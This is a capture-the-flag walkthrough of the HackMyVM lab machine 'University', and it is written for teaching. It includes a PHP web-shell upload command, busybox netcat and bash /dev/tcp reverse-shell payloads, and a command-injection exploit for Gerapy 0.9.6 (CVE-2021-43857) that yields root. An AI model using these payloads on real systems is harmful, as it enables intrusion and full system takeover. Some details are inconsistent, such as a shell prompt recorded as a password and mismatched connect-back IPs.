# University

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| University | sml | Beginner | HackMyVM |

**Summary:** University is a beginner-level machine that demonstrates common web application vulnerabilities and privilege escalation techniques. The attack path begins with network reconnaissance revealing an exposed Git repository on the web server. Analysis of the cloned repository uncovers an unrestricted file upload vulnerability in the Online Admission System application. Exploiting this weakness allows uploading a PHP web shell, leading to remote code execution as the `www-data` user. Lateral movement to user `sandra` is achieved by discovering credentials in a hidden file within the web directory. The privilege escalation phase exploits Gerapy 0.9.6, a distributed crawler management framework running with sudo permissions, which contains a critical remote code execution vulnerability (CVE-2021-43857). By leveraging this vulnerability through the Gerapy API, an authenticated attacker can inject malicious commands during project cloning operations, ultimately achieving root access on the system.

---

## Reconnaissance

### Network Discovery

Initial network scanning identified the target machine within the local subnet. Using a custom PowerShell scanning tool, a VirtualBox machine was discovered at IP `192.168.100.64`:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.64 08:00:27:A4:11:A2 VirtualBox
```

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was executed against the target to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sC -sV -p- 192.168.100.64
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 19:55 WIB
Nmap scan report for 192.168.100.64
Host is up (0.0074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 8e:ee:da:29:f1:ae:03:a5:c3:7e:45:84:c7:86:67:ce (RSA)
|   256 f8:1c:ef:96:7b:ae:74:21:6c:9f:06:9b:20:0a:d8:56 (ECDSA)
|_  256 19:fc:94:32:41:9d:43:6f:52:c5:ba:5a:f0:83:b4:5b (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0
| http-git:
|   192.168.100.64:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/rskoolrash/Online-Admission-System
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.15 seconds
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 8.4p1 running on Debian 5
- **Port 80 (HTTP):** nginx 1.18.0 web server
- **Critical Discovery:** Exposed `.git` repository at `http://192.168.100.64/.git/`
- **Git Remote URL:** `https://github.com/rskoolrash/Online-Admission-System`

The Nmap scan revealed a significant security misconfiguration: an exposed Git repository accessible through the web server. This allows attackers to download the entire source code and analyze the application for vulnerabilities.

### Source Code Analysis

The exposed Git repository pointed to a public GitHub repository. The repository was cloned for local analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ git clone https://github.com/rskoolrash/Online-Admission-System.git
Cloning into 'Online-Admission-System'...
remote: Enumerating objects: 138, done.
remote: Total 138 (delta 0), reused 0 (delta 0), pack-reused 138 (from 1)
Receiving objects: 100% (138/138), 8.34 MiB | 1.69 MiB/s, done.
Resolving deltas: 100% (19/19), done.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ cd Online-Admission-System
```

Accessing the GitHub repository directly:

![](image.png)

---

## Initial Access

### Vulnerability Discovery

Manual code review of the cloned repository revealed a critical file upload vulnerability in `fileupload.php`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university/Online-Admission-System]
└─$ cat fileupload.php

<?php
session_start();
$sp=mysqli_connect("localhost","root","","oas");
         if($sp->connect_errno){
                echo "Error <br/>".$sp->error;
}

$picpath="studentpic/";
$docpath="studentdoc/";
$proofpath="studentproof/";
$id=$_SESSION['user'];
if(isset($_POST['fpicup']))
{
$picpath=$picpath.$_FILES['fpic']['name'];
$docpath1=$docpath.$_FILES['ftndoc']['name'];
$docpath2=$docpath.$_FILES['ftcdoc']['name'];
$docpath3=$docpath.$_FILES['fdmdoc']['name'];
$docpath4=$docpath.$_FILES['fdcdoc']['name'];
$proofpath1=$proofpath.$_FILES['fide']['name'];
$proofpath2=$proofpath.$_FILES['fsig']['name'];

if(move_uploaded_file($_FILES['fpic']['tmp_name'],$picpath)
  && move_uploaded_file($_FILES['ftndoc']['tmp_name'],$docpath1)
  && move_uploaded_file($_FILES['ftcdoc']['tmp_name'],$docpath2)
  && move_uploaded_file($_FILES['fdmdoc']['tmp_name'],$docpath3)
  && move_uploaded_file($_FILES['fdcdoc']['tmp_name'],$docpath4)
  && move_uploaded_file($_FILES['fide']['tmp_name'],$proofpath1)
  && move_uploaded_file($_FILES['fsig']['tmp_name'],$proofpath2))
{

$img=$_FILES['fpic']['name'];
$img1=$_FILES['ftndoc']['name'];
$img2=$_FILES['ftcdoc']['name'];
$img3=$_FILES['fdmdoc']['name'];
$img4=$_FILES['fdcdoc']['name'];
$img5=$_FILES['fide']['name'];
$img6=$_FILES['fsig']['name'];


$query="insert into t_userdoc (s_id,s_pic,s_tenmarkpic,s_tencerpic,
    s_twdmarkpic, s_twdcerpic, s_idprfpic, s_sigpic) values
    ('$id','$img','$img1','$img2','$img3','$img4','$img5','$img6')";
        if($sp->query($query)){
     echo "Inserted to DB ";
    }else
    {
        echo "Error <br/>".$sp->error;
    }
}
else
{
echo "There is an error,please retry or ckeck path";
}
}
 ?>
```

**Critical Security Flaws Identified:**

The file upload mechanism exhibits multiple severe vulnerabilities:

```bash
$picpath=$picpath.$_FILES['fpic']['name'];
// ...
if(move_uploaded_file($_FILES['fpic']['tmp_name'],$picpath))
```

1. **No File Extension Validation:** The script does not verify file extensions, allowing upload of executable PHP files instead of legitimate image formats
2. **Predictable Storage Path:** Uploaded files are stored in the `studentpic/` directory using their original filenames, making them easily accessible
3. **Weak Session Validation:** While the script checks for `$_SESSION['user']`, it does not properly validate if the session is legitimate before processing uploads
4. **Logical AND Chain:** The conditional uses `&&` operators, requiring all seven file uploads to succeed simultaneously

### Exploitation - Remote Code Execution

A minimal PHP web shell was created to achieve remote code execution:

![shell php](image-1.png)

The web shell was uploaded to all required fields to satisfy the logical AND condition in the upload script:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university/Online-Admission-System]
└─$ curl -F "fpic=@shell.php" \
     -F "ftndoc=@shell.php" \
     -F "ftcdoc=@shell.php" \
     -F "fdmdoc=@shell.php" \
     -F "fdcdoc=@shell.php" \
     -F "fide=@shell.php" \
     -F "fsig=@shell.php" \
     -F "fpicup=1" \
     http://192.168.100.64/fileupload.php
```

**Why all fields are included:** The code uses chained `&&` operators in the `if` statement, requiring all seven uploads to succeed for the database insertion block to execute.

### Web Shell Verification

The uploaded shell was tested to confirm remote command execution capabilities:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university/Online-Admission-System]
└─$ curl http://192.168.100.64/studentpic/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Success!** The web shell is functional and executing commands as the `www-data` user.

### Reverse Shell Establishment

A netcat listener was prepared to receive the reverse shell connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

A BusyBox-based reverse shell payload was URL-encoded and executed through the web shell:

**Payload:** `busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university/Online-Admission-System]
└─$ curl http://192.168.100.64/studentpic/shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

The reverse shell successfully connected:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 61961
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stabilization

The basic shell was upgraded to a fully interactive TTY using Python:

```bash
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@university:~/html/university/studentpic$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@university:~/html/university/studentpic$
```

---

## Lateral Movement

### User Enumeration

Exploration of the `/home` directory revealed a single user account:

```bash
www-data@university:~$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Jan 18  2022 .
drwxr-xr-x 18 root   root   4096 Jan 18  2022 ..
drwxr-xr-x  3 sandra sandra 4096 Jan 18  2022 sandra
```

**Target identified:** User `sandra`

### Credential Discovery

Investigation of the web directory uncovered a hidden file containing sensitive information:

```bash
www-data@university:~$ cd html
www-data@university:~/html$ ls -la
total 16
drwxr-xr-x  3 root     root     4096 Jan 18  2022 .
drwxr-xr-x  3 root     root     4096 Jan 18  2022 ..
-rw-r--r--  1 www-data www-data   13 Jan 18  2022 .sandra_secret
drwxr-xr-x 14 www-data www-data 4096 Jan 18  2022 university
www-data@university:~/html$ cat .sandra_secret
My[REDACTED]
```

The file `.sandra_secret` contained what appeared to be a password for the `sandra` user.

### SSH Access as Sandra

Using the discovered credentials, SSH access was obtained:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university/Online-Admission-System]
└─$ ssh sandra@192.168.100.64
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
sandra@192.168.100.64's password:
Linux university 5.10.0-10-amd64 #1 SMP Debian 5.10.84-1 (2021-12-08) x86_64
...
sandra@university:~$ id
uid=1000(sandra) gid=1000(sandra) groups=1000(sandra),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
sandra@university:~$ ls -la
total 32
drwxr-xr-x 3 sandra sandra 4096 Jan 18  2022 .
drwxr-xr-x 3 root   root   4096 Jan 18  2022 ..
-rw-r--r-- 1 sandra sandra  220 Jan 18  2022 .bash_logout
-rw-r--r-- 1 sandra sandra 3526 Jan 18  2022 .bashrc
drwxr-xr-x 3 sandra sandra 4096 Jan 18  2022 .local
-rw-r--r-- 1 sandra sandra  807 Jan 18  2022 .profile
-rw------- 1 sandra sandra   20 Jan 18  2022 user.txt
-rw------- 1 sandra sandra   56 Jan 18  2022 .Xauthority
```

**User flag acquired:** The `user.txt` file is now accessible in Sandra's home directory.

---

## Privilege Escalation

### Sudo Enumeration

Checking for sudo privileges revealed a critical finding:

```bash
sandra@university:~$ sudo -l
Matching Defaults entries for sandra on university:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sandra may run the following commands on university:
    (root) NOPASSWD: /usr/local/bin/gerapy
sandra@university:~$ ls -la /usr/local/bin/gerapy
-rwxr-xr-x 1 root root 953 Jan 18  2022 /usr/local/bin/gerapy
sandra@university:~$ sudo /usr/local/bin/gerapy
Usage: gerapy [-v] [-h]  ...

Gerapy 0.9.6 - Distributed Crawler Management Framework

Optional arguments:
  -v, --version       Get version of Gerapy
  -h, --help          Show this help message and exit

Available commands:
    init              Init workspace, default to gerapy
    initadmin         Create default super user admin
    runserver         Start Gerapy server
    migrate           Migrate database
    createsuperuser   Create a custom superuser
    makemigrations    Generate migrations for database
    generate          Generate Scrapy code for configurable project
    parse             Parse project for debugging
    loaddata          Load data from configs
    dumpdata          Dump data to configs
```

**Critical Discovery:**
- Sandra can execute `/usr/local/bin/gerapy` as root without a password
- The application is **Gerapy version 0.9.6**, a distributed crawler management framework
- This version is known to contain a critical RCE vulnerability (CVE-2021-43857)

### Gerapy Exploitation Setup

Gerapy requires initialization and configuration before it can be exploited. The following setup steps were executed:

**1. Initialize Gerapy workspace:**

```bash
sandra@university:~$ sudo /usr/local/bin/gerapy init
Initialized workspace gerapy
sandra@university:~$ cd gerapy/
```

**2. Migrate the database:**

```bash
sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy migrate
Operations to perform:
  Apply all migrations: admin, auth, authtoken, contenttypes, core, django_apscheduler, sessions
Running migrations:
  Applying contenttypes.0001_initial... OK
  Applying auth.0001_initial... OK
  Applying admin.0001_initial... OK
  Applying admin.0002_logentry_remove_auto_add... OK
  Applying admin.0003_logentry_add_action_flag_choices... OK
  Applying contenttypes.0002_remove_content_type_name... OK
  Applying auth.0002_alter_permission_name_max_length... OK
  Applying auth.0003_alter_user_email_max_length... OK
  Applying auth.0004_alter_user_username_opts... OK
  Applying auth.0005_alter_user_last_login_null... OK
  Applying auth.0006_require_contenttypes_0002... OK
  Applying auth.0007_alter_validators_add_error_messages... OK
  Applying auth.0008_alter_user_username_max_length... OK
  Applying auth.0009_alter_user_last_name_max_length... OK
  Applying auth.0010_alter_group_name_max_length... OK
  Applying auth.0011_update_proxy_permissions... OK
  Applying authtoken.0001_initial... OK
  Applying authtoken.0002_auto_20160226_1747... OK
  Applying authtoken.0003_tokenproxy... OK
  Applying core.0001_initial... OK
  Applying core.0002_auto_20180119_1210... OK
  Applying core.0003_auto_20180123_2304... OK
  Applying core.0004_auto_20180124_0032... OK
  Applying core.0005_auto_20180131_1210... OK
  Applying core.0006_auto_20180131_1235... OK
  Applying core.0007_task_trigger... OK
  Applying core.0008_auto_20180703_2305... OK
  Applying core.0009_auto_20180711_2332... OK
  Applying core.0010_auto_20191027_2040... OK
  Applying django_apscheduler.0001_initial... OK
  Applying django_apscheduler.0002_auto_20180412_0758... OK
  Applying django_apscheduler.0003_auto_20200716_1632... OK
  Applying django_apscheduler.0004_auto_20200717_1043... OK
  Applying django_apscheduler.0005_migrate_name_to_id... OK
  Applying django_apscheduler.0006_remove_djangojob_name... OK
  Applying django_apscheduler.0007_auto_20200717_1404... OK
  Applying django_apscheduler.0008_remove_djangojobexecution_started... OK
  Applying sessions.0001_initial... OK
```

**3. Create a superuser account for API authentication:**

```bash
sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy createsuperuser
Username (leave blank to use 'root'): univ
Email address:
Password:
Password (again):
Superuser created successfully.
```

**Credentials created:**
- **Username:** `univ`
- **Password:** `sandra@university:~/gerapy$`

**4. Start the Gerapy server on port 8080:**

```bash
sandra@university:~/gerapy$ sudo /usr/local/bin/gerapy runserver 0.0.0.0:8080
...
```

The Gerapy web interface is now running with root privileges on `http://192.168.100.64:8080`.

### API Authentication

To interact with the Gerapy API, an authentication token is required. This was obtained through the login endpoint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ curl -X POST http://192.168.100.64:8080/api/user/auth -H "Content-Type: application/json" -d '{"username":"univ","password":"sandra@university:~/gerapy$"}'
{"token":"d39f05b0ca0ea0b22b3a2ded2679fc915f2f3a68"}
```

**Authentication Token:** `d39f05b0ca0ea0b22b3a2ded2679fc915f2f3a68`

### CVE-2021-43857 Exploitation

Gerapy 0.9.6 is vulnerable to remote code execution through command injection in the project cloning functionality. The `/api/project/clone` endpoint fails to properly sanitize the `address` parameter, allowing injection of arbitrary shell commands.

**Payload Construction:**

A base64-encoded reverse shell payload was created to evade basic filtering:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ echo "bash -i >& /dev/tcp/192.168.100.1/8888 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzg4ODggMD4mMQo=
```

**Root Reverse Shell Listener:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

**Exploit Execution:**

The malicious payload was injected into the `address` parameter of the clone API endpoint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ curl 'http://192.168.100.64:8080/api/project/clone' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Authorization: Token d39f05b0ca0ea0b22b3a2ded2679fc915f2f3a68' \
  --data-raw '{"address":"http; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzg4ODggMD4mMQo= | base64 -d | /bin/bash;"}'
```

**How the exploit works:**
1. The injected payload terminates the legitimate HTTP protocol handler with `;`
2. The base64-encoded reverse shell is decoded and piped to `/bin/bash`
3. Since Gerapy is running with sudo as root, the injected command executes with root privileges

### Root Shell Obtained

The exploit successfully triggered a root reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 62442
root@university:/home/sandra/gerapy# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@university:/home/sandra/gerapy# ^Z
zsh: suspended  nc -lvnp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/university]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 8888

root@university:/home/sandra/gerapy# cd
root@university:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
university
root@university:~# cat /home/sandra/user.txt /root/root.txt
HMV[REDACTED]
HMV[REDACTED]
```

**PWNED!**

**Vulnerability Reference:** The proof-of-concept exploit was adapted from the official Snyk security advisory: https://security.snyk.io/package/pip/gerapy/0.9.6

---

## Attack Chain Summary

1. **Reconnaissance:** Performed network discovery and port scanning, identifying SSH (22) and HTTP (80) services. Nmap revealed an exposed `.git` repository pointing to a GitHub repository containing the Online Admission System source code.

2. **Vulnerability Discovery:** Cloned the GitHub repository and conducted manual code review, discovering an unrestricted file upload vulnerability in `fileupload.php` with no file extension validation, predictable storage paths, and weak session handling.

3. **Exploitation:** Created a PHP web shell and uploaded it to all seven required fields to satisfy the logical AND condition. Verified remote code execution with `id` command, then established a reverse shell using BusyBox netcat as the `www-data` user.

4. **Internal Enumeration:** Explored the web directory `/var/www/html` and discovered a hidden file `.sandra_secret` containing credentials for user `sandra`. Used these credentials to gain SSH access and retrieve the user flag.

5. **Privilege Escalation:** Ran `sudo -l` to identify that sandra can execute `/usr/local/bin/gerapy` as root without a password. Determined the application version as Gerapy 0.9.6, which contains CVE-2021-43857 (RCE through command injection). Initialized the Gerapy framework, created API credentials, obtained an authentication token, and exploited the `/api/project/clone` endpoint by injecting a base64-encoded reverse shell payload into the `address` parameter. This executed with root privileges, providing a root shell and access to both user and root flags.

